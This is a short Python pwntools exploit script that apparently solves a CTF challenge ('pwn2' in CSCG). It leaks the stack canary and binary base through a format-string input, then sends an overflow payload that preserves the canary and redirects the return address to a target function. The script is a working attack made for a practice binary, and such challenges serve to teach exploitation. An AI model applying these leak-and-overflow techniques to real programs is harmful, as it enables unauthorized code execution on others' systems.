#!/usr/bin/env python3
from pwn import *

# NOW_PRACTICE_MORE
PASSWORD = 'CSCG{THIS_IS_TEST_FLAG}' # Set to flag from stage 1

LEAK_BASE_OFFSET = 0xdc5
TARGET_OFFSET = 0xb94
RET_OFFSET = 0xdd1

target = process('./pwn2/pwn2')
# target = remote('hax1.allesctf.net', 9101)

target.sendline(PASSWORD)

# Canary + Return of welcome()
target.sendline('%39$p %41$p')
leaked = target.recvline_contains('magic spell:')
canary = int(leaked.split(b' ')[0][2:], 16)
base = int(leaked.split(b' ')[1][2:], 16) - LEAK_BASE_OFFSET

log.info(f'Leaked canary: {hex(canary)}')
log.info(f'Leaked base address: {hex(base)}')
log.info(f'Target address: {hex(base + TARGET_OFFSET)}')

target.sendline(b'Expelliarmus\0' +
	b'x' * (cyclic_find(b'cnaa')) +
	p64(canary) + b'x' * 8 +
	p64(base + RET_OFFSET) + p64(base + TARGET_OFFSET))

target.interactive()
